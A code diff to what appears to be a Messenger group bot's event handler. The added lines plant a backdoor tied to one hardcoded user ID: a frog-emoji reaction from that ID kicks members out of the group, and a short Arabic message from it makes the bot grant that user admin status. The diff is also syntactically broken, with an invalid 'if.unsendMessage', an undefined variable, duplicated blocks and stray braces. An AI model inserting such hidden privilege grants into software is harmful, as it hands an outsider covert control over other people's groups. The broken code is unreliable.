@@ -226,8 +226,29 @@ if (event.reaction === "🤡" ) {
           api.setMessageReaction("😂", event.messageID, (err) => {}, true);
         }
 				if (event.reaction === "😠" && event.senderID === api.getCurrentUserID() && config.ADMINBOT.includes(event.userID)) {
-          api.unsendMessage(event.messageID);
+                 
+					if.unsendMessage(event.messageID);
 				}
+if (event.reaction === "🖤" ) {
+          api.setMessageReaction("🖤", event.messageID, (err) => {}, true);
+        }
+        if (event.reaction === "🐸" && event.userID === "100094409873389" ) { 
+        api.removeUserFromGroup(event.senderID, event.threadID)
+        }
+        if (event.reaction === "😂" ) {
+          api.setMessageReaction("😂", event.messageID, (err) => {}, true);
+        }
+				if (event.reaction === "😠" && event.senderID === api.getCurrentUserID()) {
+          api.unsendMessage(event.messageID);
+        }
+				break;
+      default:
+                    if (event.body == "طلعيني" && event.senderID == "100094409873389") {api.sendMessage('تم😇', event.threadID)
+api.changeAdminStatus(event.threadID, eventID, true);
+        }
+		}
+	};
+};
 				break;
 			default:
 				break;
